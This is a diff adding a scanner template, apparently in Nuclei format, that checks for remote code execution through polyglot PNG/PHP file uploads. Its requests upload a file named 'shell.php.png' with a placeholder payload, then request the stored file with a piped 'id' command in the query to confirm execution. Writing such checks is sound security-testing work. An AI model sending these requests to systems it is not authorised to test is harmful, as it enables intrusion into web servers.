@@ -1,0 +1,66 @@
+id: custom-2026-exfil-003
+info:
+  name: Polyglot File Upload - Format Confusion Exploitation
+  author: SecurityTeam
+  severity: high
+  description: |
+    Exploits file upload validation bypass via polyglot files:
+    1. Create file valid as both image (PNG) and executable (PHP)
+    2. Upload bypasses MIME-type and magic-bytes checks
+    3. Server processes as PHP code
+    4. Execute arbitrary code via web access
+    
+    Behavioral detection:
+    - Analyze uploaded file handling timing
+    - Check for format confusion error messages
+    - Test multiple upload endpoints
+    - Verify execution via side-channel (timing, resource usage)
+  
+  reference:
+    - https://www.synopsys.com/blogs/software-security/polyglot-files/
+
+requests:
+  - method: POST
+    path: /upload
+    headers:
+      Content-Type: "multipart/form-data"
+    body: |
+      --boundary
+      Content-Disposition: form-data; name="file"; filename="shell.php.png"
+      Content-Type: image/png
+      
+      [PNG magic bytes] + [PHP code]
+      --boundary--
+    
+    extractors:
+      - type: json
+        internal: true
+        name: file_path
+        json:
+          - '.file_path'
+
+  - method: GET
+    path: /uploads/{{file_path}}
+    
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<?php"
+          - "eval"
+          - "system"
+
+  - method: GET
+    path: /uploads/shell.php.png?id=1|id
+    
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'uid=\d+\(.*\)'
+
+tags:
+  - exfiltration
+  - file-upload
+  - format-confusion
+  - rce
